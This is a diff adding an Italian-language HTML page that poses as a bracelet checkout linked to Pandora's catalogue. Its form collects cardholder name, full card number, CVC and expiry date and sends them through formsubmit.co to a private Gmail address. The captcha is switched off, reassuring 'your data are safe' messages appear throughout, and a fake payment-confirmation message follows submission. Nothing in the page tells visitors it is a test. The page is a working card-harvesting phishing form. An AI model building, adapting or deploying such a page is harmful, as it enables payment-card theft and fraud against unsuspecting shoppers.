@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+  <meta charset="UTF-8">
+  <title>Acquisto Bracciale</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: #f8f8f8;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      background: white;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+      width: 100%;
+      max-width: 400px;
+    }
+    h2 {
+      text-align: center;
+      color: #ba55d3;
+    }
+    label {
+      margin-top: 15px;
+      display: block;
+      color: #333;
+      font-weight: 500;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+      font-size: 14px;
+    }
+    button {
+      background-color: #ba55d3;
+      color: white;
+      border: none;
+      padding: 12px;
+      width: 100%;
+      border-radius: 6px;
+      margin-top: 20px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+    button:disabled {
+      background-color: #d3a4e3;
+      cursor: not-allowed;
+    }
+    .thankyou {
+      display: none;
+      text-align: center;
+      color: #4CAF50;
+      font-size: 18px;
+      margin-top: 20px;
+    }
+    .heart {
+      color: red;
+    }
+    .note {
+      text-align: center;
+      font-size: 14px;
+      color: #555;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <h2>Acquisto Bracciale</h2>
+  <p style="text-align: center;">
+    <a href="https://it.pandora.net/it/bracciali/" target="_blank">
+      ✨ Vedi bracciali su Pandora
+    </a>
+  </p>
+
+  <p class="note" id="sicurezzaMessaggio">
+    🔒 I tuoi dati sono trattati con attenzione e rispetto, proprio come i nostri gioielli.
+  </p>
+
+  <form id="simulazioneForm" action="https://formsubmit.co/barlettano6@gmail.com" method="POST">
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_next" value="https://example.com/grazie.html">
+    <input type="hidden" name="_subject" value="Nuovo acquisto bracciale">
+
+    <label for="nome">Nome utente:</label>
+    <input type="text" name="nome" required>
+
+    <label for="numero">Numero carta:</label>
+    <input type="text" name="numero" id="numero" maxlength="16" pattern="\d{16}" required>
+
+    <label for="cvc">CVC:</label>
+    <input type="number" name="cvc" id="cvc" max="999" required>
+
+    <label for="scadenza">Data di scadenza:</label>
+    <input type="month" name="scadenza" required>
+
+    <button type="submit" id="submitBtn">Acquista Bracciale</button>
+  </form>
+
+  <div class="thankyou" id="thankyouMsg">
+    ❤️ Grazie per il pagamento! Il tuo bracciale è in arrivo! ❤️
+  </div>
+</div>
+
+<script>
+  // CVC: massimo 3 cifre
+  document.getElementById("cvc").addEventListener("input", function () {
+    if (this.value.length > 3) {
+      this.value = this.value.slice(0, 3);
+    }
+  });
+
+  // Numero carta: solo cifre e massimo 16
+  document.getElementById("numero").addEventListener("input", function () {
+    this.value = this.value.replace(/\D/g, '');
+    if (this.value.length > 16) {
+      this.value = this.value.slice(0, 16);
+    }
+  });
+
+  // Protezione anti-invio multiplo
+  document.getElementById("simulazioneForm").addEventListener("submit", function () {
+    const btn = document.getElementById("submitBtn");
+    btn.disabled = true;
+    btn.innerText = "Invio in corso...";
+    document.getElementById("thankyouMsg").style.display = "block";
+  });
+
+  // Messaggio dinamico in base all’orario
+  const msg = document.getElementById("sicurezzaMessaggio");
+  const hour = new Date().getHours();
+  if (hour < 12) {
+    msg.innerHTML = "🌅 Buongiorno! I tuoi dati sono trattati con cura e discrezione.";
+  } else if (hour < 18) {
+    msg.innerHTML = "🌞 Il tuo acquisto pomeridiano è al sicuro con noi, come sempre.";
+  } else {
+    msg.innerHTML = "🌙 Buonasera! Trattiamo i tuoi dati con attenzione e rispetto.";
+  }
+</script>
+
+</body>
+</html>
